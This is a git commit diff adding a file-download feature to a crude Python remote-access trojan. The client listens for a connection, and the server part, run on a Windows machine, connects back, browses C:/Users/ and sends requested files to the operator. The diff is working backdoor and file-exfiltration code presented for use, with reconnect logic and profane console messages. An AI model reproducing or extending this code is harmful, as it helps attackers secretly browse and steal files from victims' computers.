7bf96f8361c313f0157960bb131dfc8558c253b5
Brian Novius <brianvis@xs4all.nl>
2019-01-29 18:48:57 +0100

    Added download

--- Client.py
+++ Client.py
@@ -5,6 +5,8 @@ import os
 import pickle
 import time
 import pip
+import _winapi
+import ctypes
 
 print("What the fuck you want")
 print("1. Listen")
@@ -29,6 +31,14 @@ elif q == "2":
     print("ok so create a payload huh? i dont care so im not doing it")
 
 # Initialization and stuff
+try:
+    os.mkdir("/Pedopreter")
+except:
+    print("already exists")
+try:
+    os.mkdir("/Pedopreter/Downloaded")
+except:
+    print("already exists")
 
 
 BUFFER_SIZE = 1024
@@ -36,27 +46,62 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.bind((TCP_IP, TCP_PORT))
 s.listen(1)
+sold = s
 s, addr = s.accept()
 print('Connection address:', addr)
 
-
 while True:
-    s.settimeout(60)
-    thing = input()
-    thing2 = thing.split()
-    if thing2[0]:
-        if thing2[0] == "ls":
-            s.send(" ".join(thing2).encode())
-            dataraw = s.recv(BUFFER_SIZE).decode()
-            data = dataraw.split()
-            for x in data:
-                print(x)
-        elif thing2[0] == "cd":
-            if thing2[1]:
+    try:
+        s.settimeout(60)
+        thing = input()
+        thing2 = thing.split()
+        if thing2[0]:
+            if thing2[0] == "help":
+                print("Following commands:")
+                print("cd [path]")
+                print("ls [path]")
+                print("download [full path of wanted download] [output file name INCLUDING EXTRENSION like .txt]")
+            elif thing2[0] == "ls":
                 s.send(" ".join(thing2).encode())
-                s.settimeout(10)
-                try:
-                    q = s.recv(BUFFER_SIZE).decode()
-                    print(q)
-                except:
-                    print("timed out")
+                dataraw = s.recv(BUFFER_SIZE).decode()
+                data = dataraw.split()
+                for x in data:
+                    print(x)
+            elif thing2[0] == "cd":
+                if len(thing2) == 2:
+                    s.send(" ".join(thing2).encode())
+                    s.settimeout(10)
+                    try:
+                        q = s.recv(BUFFER_SIZE).decode()
+                        print(q)
+                    except:
+                        print("timed out")
+            elif thing2[0] == "download":
+                if len(thing2) == 3:
+                    s.send(" ".join(thing2).encode())
+                    f = open("/Pedopreter/Downloaded/"+thing2[2], "wb")
+                    l = s.recv(4096)
+                    f.write(l)
+                    while (l):
+                        print("receiving...")
+                        try:
+                            l = s.recv(4096)
+                            f.write(l)
+                        except:
+                            print("Something went wrong during the download. Maybe it doesnt exist anymore or the connection was closed. fuck you man you cant even download a file properly")
+                    
+                    print("Done")
+    except Exception as e:
+        print("whoops something went wrong.. reconnecting..")
+        print("this was the error:")
+        print(e)
+        sold.close()
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.bind((TCP_IP, TCP_PORT))
+        s.listen(1)
+        s, addr = sold.accept()
+
+
+
+
--- Server.py
+++ Server.py
@@ -12,12 +12,7 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.connect((TCP_IP, TCP_PORT))
 os.chdir("C:/Users/")
-def reconnect():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.connect((TCP_IP, TCP_PORT))
-    conn = s
-    return reconnect
+
 
 conn = s
 while 1:
@@ -65,12 +60,31 @@ while 1:
     except:
         print("")
     if data[0] == "ls":
-        if len(data) == 2:
-            thlst = os.listdir(data[1])
-            conn.send(' '.join(thlst).encode())
-        else:
-            thlst = os.listdir(os.getcwd())
-            conn.send(" ".join(thlst).encode())
+        try:
+            if len(data) == 2:
+                thlst = os.listdir(data[1])
+                conn.send(' '.join(thlst).encode())
+            else:
+                thlst = os.listdir(os.getcwd())
+                conn.send(" ".join(thlst).encode())
+        except:
+            connected == False
+            while connected == False:
+                time.sleep(1)
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                    s.connect((TCP_IP, TCP_PORT))
+                    conn = s
+                    connected = True
+                    print("Woohoo Data is back!")
+                    conn.settimeout(15)
+                    dataraw = conn.recv(BUFFER_SIZE).decode()
+                    data = dataraw.split()
+                except:
+                    s.close()
+                    print("Data lost..")
+
     elif data[0] == "cd":
         if len(data) == 2:
             try:
@@ -78,5 +92,18 @@ while 1:
                 conn.send(("Successful! Path is now" + os.getcwd()).encode())
             except:
                 conn.send("Unsuccessful! Path doesnt exist or something".encode())
+    elif data[0] == "download":
+        if len(data) == 3:
+            try:
+                f = open(data[1], "rb")
+                print('Sending...')
+                l = f.read(1024)
+                while (l):
+                        print('Sending...')
+                        s.send(l)
+                        l = f.read(1024)
+                print("sent")
+            except:
+                print("something went wrong")
 
 conn.close()
